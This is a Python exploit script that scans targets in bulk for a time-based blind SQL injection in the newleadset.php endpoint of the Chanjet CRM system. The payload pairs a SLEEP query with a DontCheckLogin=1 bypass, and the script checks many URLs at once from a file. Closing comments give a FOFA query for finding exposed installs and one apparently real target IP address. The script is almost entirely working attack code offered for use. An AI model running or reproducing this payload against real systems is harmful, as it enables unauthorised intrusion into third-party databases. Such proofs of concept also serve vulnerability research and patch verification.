import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """畅捷通CRM系统newleadset.php接口存在SQL注入"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='畅捷通CRM系统newleadset.php接口存在SQL注入漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/lead/newleadset.php?gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(5)))HAjH)--+-&DontCheckLogin=1"
    headers = {
        "User-Agent":"Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip,deflate",
    }
    try:
        response = requests.get(url=target + payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 and "Fatal erro" in response.text:
            print(f"[+]{target}存在sql注入漏洞")
            with open('畅捷通TP_result.txt', 'a') as f:
                f.write(f"{target}存在sql注入漏洞\n")
        else:
            print(f"[-]{target}不存在ql注入漏洞")
    except:
        print(f"{target}可能存在sql注入漏洞")
if __name__ == '__main__':
    main()

# fofa语句
# app="畅捷通-畅捷CRM"
# http://124.71.22.118:8000